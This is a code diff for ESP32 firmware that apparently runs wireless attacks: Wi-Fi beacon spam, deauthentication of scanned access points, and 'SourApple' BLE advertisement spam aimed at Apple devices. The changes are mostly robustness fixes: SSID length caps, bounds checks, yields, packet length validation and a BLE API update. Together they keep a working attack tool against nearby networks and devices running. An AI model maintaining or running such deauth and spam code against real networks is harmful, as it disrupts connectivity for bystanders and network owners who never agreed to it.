@@ -180,6 +180,7 @@ void sendRawBeacon(const char* ssid, uint8_t channel, int macSeed) {
   mac[5] = (uint8_t)macSeed;
 
   uint8_t ssidLen = strlen(ssid);
+  if (ssidLen > 32) ssidLen = 32;
   uint8_t packet[128] = {
     0x80, 0x00,                         // Beacon
     0x00, 0x00,                         // Duration
@@ -231,6 +232,7 @@ void runBeaconSpamStep(bool boost) {
       char ssidBuf[32];
       getRealisticSSID(ssidBuf, ssidIndex);
       sendRawBeacon(ssidBuf, currentChannel, ssidIndex);
+      yield();
       ssidIndex = (ssidIndex + 1) % 100;
       esp_task_wdt_reset();
       yield();
@@ -279,6 +281,7 @@ void runDeauthStep(bool boost) {
     uint8_t targetChannel = currentChannel;
     
     if (scannedCount > 0) {
+      if (deauthIndex >= scannedCount) deauthIndex = 0;
       memcpy(targetBSSID, scannedBSSIDs[deauthIndex], 6);
       targetChannel = scannedChannels[deauthIndex];
       esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
@@ -319,7 +322,7 @@ void runDeauthStep(bool boost) {
       yield();
     }
     
-    if (random(80) == 0) {
+    if (random(150) == 0) {
       char buf[64];
       if (scannedCount > 0) {
         snprintf(buf, sizeof(buf), "[Deauth] Targeted AP: %02X:%02X:%02X:%02X:%02X:%02X (ch %d)%s", 
@@ -772,7 +775,8 @@ void runSourAppleStep(bool boost) {
 
     const uint8_t *payload = blePayloads[blePayloadIndex];
     uint8_t len = payload[0];
-    advData.setManufacturerData((const uint8_t*)&payload[1], (uint8_t)len);
+    String manufDataStr((char*)&payload[1], len);
+    advData.setManufacturerData(manufDataStr);
 
     pAdvertising->setAdvertisementData(advData);
     pAdvertising->start();
@@ -1120,8 +1124,12 @@ void OnDataRecv(const esp_now_recv_info_t *info, const uint8_t *incomingData, in
 void OnDataRecv(const uint8_t *mac_addr, const uint8_t *incomingData, int len) {
   const uint8_t *srcMac = mac_addr;
 #endif
-  if (len != sizeof(myData)) {
-    Serial.printf("Invalid packet len: %d\n", len);
+  if (len > sizeof(myData)) {
+    Serial.printf("Packet too large: %d\n", len);
+    return;
+  }
+  if (len < sizeof(myData)) {
+    Serial.printf("Packet too small: %d\n", len);
     return;
   }
   memcpy(&myData, incomingData, sizeof(myData));
